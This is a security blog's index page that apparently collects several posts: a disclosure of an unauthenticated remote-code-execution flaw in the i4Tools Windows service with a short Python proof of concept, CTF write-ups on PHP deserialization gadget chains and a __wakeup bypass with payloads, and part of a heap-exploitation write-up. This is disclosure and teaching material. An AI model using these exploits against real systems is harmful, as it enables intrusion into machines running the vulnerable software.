<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>My Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="My Blog">
<meta property="og:url" content="http://b.iakb.org/index.html">
<meta property="og:site_name" content="My Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="j1ans">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="My Blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">My Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://b.iakb.org"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-i4tools-unauthorized-RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/28/i4tools-unauthorized-RCE/" class="article-date">
  <time class="dt-published" datetime="2026-01-28T01:19:45.000Z" itemprop="datePublished">2026-01-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/28/i4tools-unauthorized-RCE/">i4tools unauthorized RCE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>i4ToolsService.exe is a service program for i4Tools (爱思助手), automatically installed upon setup, and runs with SYSTEM privileges by default.</p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160441685.png" alt="image-20260127160441685"></p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160502400.png" alt="image-20260127160502400"></p>
<p>The service listens on port 19991 across all network interfaces (0.0.0.0) by default upon system startup.</p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160552999.png" alt="image-20260127160552999"></p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160619408.png" alt="image-20260127160619408"></p>
<p>Cause of the vulnerability: The port lacks any authentication mechanisms and contains a backdoor.</p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160708264.png" alt="image-20260127160708264"></p>
<p>The function reads up to 2048 bytes from TCP into a buffer. It then interprets the first 4 bytes of the buffer as a DWORD. If this value is 1001 (0x3E9), it stores the subsequent bytes into a destination and then proceeds to the sub_7FF7C56D28C0 function.</p>
<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127161003911.png" alt="image-20260127161003911"></p>
<p>sub_7FF7C56D28C0 directly executes the Destination, leading to Remote Code Execution (RCE).</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket
s = socket.socket()
s.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">19991</span>))
s.send(<span class="hljs-string">b&#x27;\xE9\x03\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;calc.exe&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)</code></pre>

<p><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127161125770.png" alt="image-20260127161125770"></p>
<p>execute calc.exe</p>
<h2 id="Risk"><a href="#Risk" class="headerlink" title="Risk"></a>Risk</h2><p>Based on the previous code analysis, the service defaults to listening on all network interfaces (0.0.0.0:19991) and lacks any authentication measures. The function sub_7FF7C56D28C0 directly executes the received data, leading to Remote Code Execution (RCE). Therefore, the risks include: if the port is exposed to the public internet, attackers can remotely control the system; in virtualized environments, it may enable virtual machine escape through NAT; within the internal network, attackers can access other machines with administrator privileges.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2026/01/28/i4tools-unauthorized-RCE/" data-id="cmlh5cv7x000rskua94540e46" data-title="i4tools unauthorized RCE" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/0day/" rel="tag">0day</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/unauthorized/" rel="tag">unauthorized</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP反序列化入门-NISACTF-2022-babyserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/" class="article-date">
  <time class="dt-published" datetime="2026-01-08T20:06:05.000Z" itemprop="datePublished">2026-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/">PHP反序列化入门 - [NISACTF 2022]babyserialize</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;waf.php&quot;</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&quot;show_me_flag&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;
            <span class="hljs-title function_ invoke__">hint</span>();
        &#125;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>,<span class="hljs-variable">$val</span></span>)</span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;fun=<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>];
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fun;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;TXW4EVER&quot;</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">&#x27;abc&#x27;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">&quot;sixsixsix&quot;</span>)&#123;
            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);
        &#125;
    &#125;
&#125;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]))&#123;
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>]);
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
&#125;

<span class="hljs-comment">//func checkcheck($data)&#123;</span>
<span class="hljs-comment">//  if(preg_match(......))&#123;</span>
<span class="hljs-comment">//      die(something wrong);</span>
<span class="hljs-comment">//  &#125;</span>
<span class="hljs-comment">//&#125;</span>

<span class="hljs-comment">//function hint()&#123;</span>
<span class="hljs-comment">//    echo &quot;.......&quot;;</span>
<span class="hljs-comment">//    die();</span>
<span class="hljs-comment">//&#125;</span>
<span class="hljs-meta">?&gt;</span>


</code></pre>

<p>代码接收一个ser变量来反序列化</p>
<pre><code class="hljs PHP"><span class="hljs-comment">//class NISA   </span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever); <span class="hljs-comment">//eval高危函数 执行代码</span>
    &#125;</code></pre>

<p>首先我们的最终目的肯定是触发NISA的invoke 方法 - 对象被当作函数调⽤时</p>
<p>然后我们查找对象在哪里被当作函数调用</p>
<pre><code class="hljs PHP"><span class="hljs-comment">//Class ilovetxw    </span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();
    &#125;</code></pre>

<p>然后发现在Ilovetxw的toString方法会被调用 - 把类当作字符串使⽤时调用</p>
<pre><code class="hljs PHP"><span class="hljs-comment">// Class Four        </span>
<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">&quot;sixsixsix&quot;</span>)&#123;
            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);
        &#125;</code></pre>

<p>这里会把a变量转换成小写(strtolower)肯定调用toString</p>
<p>但是拥有判断fun &#x3D; “sixsixsix”而fun是private私有</p>
<pre><code class="hljs PHP"><span class="hljs-comment">// class ilovetxw    </span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;
        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];
    &#125;</code></pre>

<p>这里可以设置fun 为入参</p>
<p>call是在对象上下⽂中调⽤不可访问的⽅法时触发</p>
<pre><code class="hljs PHP"><span class="hljs-comment">//class TianXiWei</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);
&#125;</code></pre>

<p>也就是 TianXiWei::_wakeup -&gt; ilovetxw::__call -&gt; Four:: _set -&gt; ilovetxw::_toString -&gt; NISA::__invoke</p>
<pre><code class="hljs PHP"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TianXiWei</span>();
<span class="hljs-variable">$a</span>-&gt;ext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();
<span class="hljs-variable">$a</span>-&gt;ext-&gt;huang = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">four</span>();
<span class="hljs-variable">$a</span>-&gt;x = <span class="hljs-string">&quot;sixsixsix&quot;</span>; <span class="hljs-comment">//fun </span>
<span class="hljs-variable">$a</span>-&gt;ext-&gt;huang-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();
<span class="hljs-variable">$a</span>-&gt;ext-&gt;huang-&gt;a-&gt;su = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$a</span>-&gt;ext-&gt;huang-&gt;a-&gt;su-&gt;txw4ever = <span class="hljs-string">&quot;SYSTEM(&#x27;cat /f*&#x27;);&quot;</span>;
<span class="hljs-variable">$a</span>-&gt;ext-&gt;huang-&gt;a-&gt;su-&gt;fun = <span class="hljs-string">&quot;666&quot;</span>;
<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));</code></pre>

<h2 id="邪修"><a href="#邪修" class="headerlink" title="邪修"></a>邪修</h2><pre><code class="hljs PHP"><span class="hljs-comment">//class NISA</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">&quot;show_me_flag&quot;</span>)&#123;
        <span class="hljs-title function_ invoke__">hint</span>();
    &#125;
&#125;</code></pre>

<p>NISA会在wakeup里面与”show_me_flag”弱比较 假设我们的fun设置成ilovetxw这个类 那不是直接会调用tostring方法吗 </p>
<pre><code class="hljs PHP"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$a</span> -&gt;fun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();
<span class="hljs-variable">$a</span> -&gt;fun -&gt;su = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$a</span> -&gt;fun -&gt;su-&gt;txw4ever = <span class="hljs-string">&quot;SYSTEM(&#x27;cat /f*&#x27;);&quot;</span>;
<span class="hljs-variable">$a</span> -&gt;fun -&gt;su-&gt;fun = <span class="hljs-string">&quot;666&quot;</span>;
<span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));</code></pre>

<p><img src="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/image-20260109041952891.png" alt="image-20260109041952891"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-NISACTF-2022-babyserialize/" data-id="cmlh5cv7s0008skua9vfecp7y" data-title="PHP反序列化入门 - [NISACTF 2022]babyserialize" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP反序列化入门-no-wakeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/" class="article-date">
  <time class="dt-published" datetime="2026-01-08T19:34:43.000Z" itemprop="datePublished">2026-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/">PHP反序列化入门 - no_wakeup</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>学一下Web 要不然渗透打不进去我的内网工具没用！</p>
<p>这题提示了nowakeup 那么就是绕过wakeup </p>
<p>因为wakeup会给passwd sha1加密 那么肯定不能得到wllm</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;


        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;
            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;
        &#125;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);
        &#125;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;
                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;
            &#125;
        &#125;
    &#125;

<span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);

<span class="hljs-meta">?&gt;</span></code></pre>

<p>__wakeup绕过技巧  __wakeup 绕过 （CVE-2016-7124） &#x2F;&#x2F; 当序列化字符串中对象属性个数 &gt; 实际属性个数时，__wakeup不执⾏</p>
<pre><code class="hljs PHP"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();
<span class="hljs-variable">$a</span>-&gt;admin = <span class="hljs-string">&quot;admin&quot;</span>;
<span class="hljs-variable">$a</span>-&gt;passwd = <span class="hljs-string">&quot;wllm&quot;</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre>

<p>得到O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;} </p>
<p>然后第一个6是类名 第一个2 是类型个数 将类型个数改成3 即可跳过wakeup </p>
<p><img src="/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/image-20260109034342436.png" alt="image-20260109034342436"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://b.iakb.org/2026/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-no-wakeup/" data-id="cmlh5cv7u000eskua0xku71f3" data-title="PHP反序列化入门 - no_wakeup" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2025年广西网络与信息安全职业技能竞赛决赛-pwn-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/" class="article-date">
  <time class="dt-published" datetime="2025-11-21T04:12:43.000Z" itemprop="datePublished">2025-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/">2025年广西网络与信息安全职业技能竞赛决赛 pwn writeup</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>比赛开始的时候就发现是一道2.35的堆，但是采用了C++所以需要patch更多的so，设置了rpath和直接set-interpreter、replace-needed 发现总会有libm.so.6 patch不上导致无法搭建和靶机一样的环境，看了一下这道题似乎没有什么特别的，决定用house of apple2 打 。本机是2.39的glibc在利用方式似乎和2.35没啥区别，就先拿2.39的打了。patch这个文件都花费了很长的时间，最后实在没办法就用本地环境了。</p>
</blockquote>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>因为此题是基于存在释放区块去做的Tcache attack，所以只需要把call delete的汇编nop掉就无法释放区块了，也就不会存在任意地址写，无法利用漏洞</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/7%5D53BEQ%5BEV%5BB_DPRA7C%7BUX.png"></p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121105307250.png" alt="image-20251121105307250"></p>
<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>查保护发现保护全开 未去符号表 判断大概率堆题</p>
<p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121105553396.png" alt="image-20251121105553396"></p>
<p>当时在靶机上</p>
<pre><code class="hljs Shell">strings libc.so.6 | grep &quot;ubuntu&quot;</code></pre>

<p>发现是2.35的libc，从2.34起去掉了钩子函数，且有fd加密，那么最简单的方式就是house of apple2 打FILE_IO</p>
<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121105359211.png" alt="image-20251121105359211"></p>
<p>由于题目是C++写的，所以我们普通的malloc free不存在，而是由new delete所替代。我们可以看到可以创建 0xff - 0x1ff内的chunk，最大可创建17个chunk，随后地址存放在note全局变量内(其实当时想着任意地址写notes然后控制多次任意地址写，但是保护全开要泄露proc_base，而且一次任意地址写已经够了)</p>
<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110009363.png" alt="image-20251121110009363"></p>
<p>在delete_note函数中使用delete释放了new出来的chunk，但是并没有对全局变量note内存放的地址进行清零，所以会导致UAF</p>
<h3 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h3><p><img src="/2025/11/21/2025%E5%B9%B4%E5%B9%BF%E8%A5%BF%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-pwn-writeup/image-20251121110131037.png" alt="image-20251121110131037"></p>
<p>我们可以看到在函数先判断了flag是否等于1 ，如果不等于1就直接退出,然后函数末尾会把flag减去1</p>
